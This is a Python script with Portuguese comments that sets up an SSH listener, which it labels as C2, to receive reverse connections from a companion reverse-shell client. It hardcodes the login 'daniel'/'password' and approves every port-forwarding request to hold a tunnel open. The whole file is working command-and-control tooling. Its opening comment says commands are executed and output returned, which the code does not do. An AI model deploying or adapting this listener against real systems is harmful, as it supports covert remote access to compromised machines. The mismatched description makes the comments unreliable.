### Script: ssh_server.py
# Este script é o servidor que irá receber a conexão reversa do cliente (ssh_rcmd_reverse_shell.py). 
# Ele utiliza a biblioteca Paramiko para criar um servidor SSH e aceitar conexões.
# O servidor escuta na porta 2222 e, quando um cliente se conecta, ele aceita a sessão e aguarda comandos do cliente.
# O cliente envia comandos para o servidor, que os executa e retorna a saída de volta para o cliente. 

import os
import paramiko
import socket
import sys
import threading
import time

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session' or kind == 'direct-tcpip':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == 'daniel') and (password == 'password'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    def check_port_forward_request(self, address, port):
        print(f"[*] Pedido de encaminhamento recebido para {address}:{port}")
        return True

if __name__ == '__main__':
    # Escuta em todas as interfaces
    server = '0.0.0.0'
    ssh_port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print(f'[+] C2 ouvindo em {server}:{ssh_port}...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Falha na Escuta: ' + str(e))
        sys.exit(1)
    
    print(f'[+] Conexão recebida de: {addr}')
    
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException:
        print("[-] Falha na negociação SSH.")
        sys.exit(1)
    
    # Loop Infinito para segurar o túnel
    try:
        while bhSession.is_active():
            time.sleep(1)
    except KeyboardInterrupt:
        bhSession.close()
